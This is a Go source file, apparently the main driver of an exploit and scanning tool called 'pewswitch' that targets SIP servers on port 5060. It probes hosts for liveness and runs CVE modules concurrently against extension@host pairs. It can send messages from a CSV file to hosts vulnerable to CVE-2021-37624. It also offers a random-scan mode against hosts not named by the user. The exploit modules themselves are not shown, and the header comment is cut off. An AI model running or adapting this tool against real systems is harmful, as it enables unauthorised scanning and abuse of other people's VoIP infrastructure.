// Exploit for

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"
)

func processHost(host string) {
	var pResult fResult
	for vuln, runner := range vulnToModule {
		if isItemIn(vuln, &allvulns) {
			runner.(func(string, *fResult))(host, &pResult)
		}
	}
	pResult.Host = strings.Split(strings.Split(host, "@")[1], ":")[0]
	finalResults = append(finalResults, pResult)
}

func initScan(allhosts, allexts *[]string) {
	log.Println("Checking if hosts are alive and responding to SIP...")

	var alivehosts []string
	xmap := checkAlive(allhosts)
	for target, alive := range xmap {
		if alive {
			log.Println("Good host:", target)
			alivehosts = append(alivehosts, target)
		} else {
			log.Printf("Looks like %s is down / not responding to SIP.", target)
		}
	}

	hosts := make(chan string, maxConcurrent)
	maxProcs := new(sync.WaitGroup)
	maxProcs.Add(maxConcurrent)

	cwd, _ := os.Getwd()
	log.Printf("Creating output directory %s under %s...", outdir, cwd)
	_, err := os.Stat(outdir)
	if err != nil {
		if os.IsNotExist(err) {
			log.Println("Output directory doesn't exist. Creating one...")
			if err = os.Mkdir(outdir, 0777); err != nil {
				log.Fatalln(err.Error())
			}
		}
	}

	startTime := time.Now()
	log.Println("Starting scan at:", startTime.String())
	for i := 0; i < maxConcurrent; i++ {
		go func() {
			for {
				host := <-hosts
				if host == "" {
					break
				}
				processHost(host)
			}
			maxProcs.Done()
		}()
	}

	for _, xhost := range alivehosts {
		for _, ext := range *allexts {
			hosts <- fmt.Sprintf("%s@%s", ext, xhost)
		}
	}

	close(hosts)
	maxProcs.Wait()

	if err = writeToJSON(&finalResults); err != nil {
		log.Panicln(err)
	}

	log.Println("Scan finished at:", time.Now().String())
	log.Printf("Total %d hosts scanned in %s.", len(*allhosts), time.Since(startTime).String())
}

func main() {
	flag.IntVar(&delay, "delay", 0, "Delay in seconds between subsequent requests.")
	flag.IntVar(&maxConcurrent, "threads", 2, "Number of concurrent hosts to process.")
	flag.StringVar(&userAgent, "ua", fmt.Sprintf("pewswitch/%s", version), "Custom user-agent string to use.")
	flag.StringVar(&cveToScan, "cve", "", "Scan for a specific vuln rather than both.")
	flag.StringVar(&extensions, "exts", "1005", "Comma separated list of extensions to scan.")
	flag.StringVar(&extFile, "ext-file", "", "Specify a file containing extensions instead of '-exts'.")
	flag.StringVar(&sendmsgs, "msg-file", "", "Specify a CSV file containing messages to be sent (if found vulnerable to CVE-2021-37624).")
	flag.StringVar(&outdir, "output", "./pewswitch-results/", "Output directory to write the results to.")
	flag.BoolVar(&randomScan, "random-scan", false, "Here we go pew pew pew.")
	flag.Parse()

	fmt.Print(lackofart, "\n\n")
	targets := flag.Args()
	if len(targets) < 1 && !randomScan {
		log.Println("You need to supply at least a valid target & extension to scan!\n\nUsage:")
		flag.PrintDefaults()
		os.Exit(1)
	}
	if len(extensions) < 1 && len(extFile) < 1 {
		log.Println("You need to supply at least a valid extension to scan! Use '-exts' or '-ext-file'.\n\nUsage:")
		flag.PrintDefaults()
		os.Exit(1)
	}
	if len(cveToScan) != 0 {
		allvulns = []string{strings.ToLower(cveToScan)}
	}
	xflag := false
	for x := range targets {
		if !strings.Contains(targets[x], ":") {
			xflag = true
			targets[x] = fmt.Sprintf("%s:5060", targets[x])
		}
	}
	// just letting the user know we're defaulting to 5060.
	if xflag {
		log.Println("No port supplied, using default port 5060 for targets...")
	}
	for _, ext := range strings.Split(extensions, ",") {
		allexts = append(allexts, strings.TrimSpace(ext))
	}
	if len(extFile) > 0 {
		allexts = append(allexts, *readExtensionsFromFile(extFile)...)
	}
	if len(sendmsgs) > 0 {
		msgstosend = append(msgstosend, readCsvFile(sendmsgs)...)
	} else {
		msgstosend = append(msgstosend, defaultMsgText)
	}
	initScan(&targets, &allexts)
}
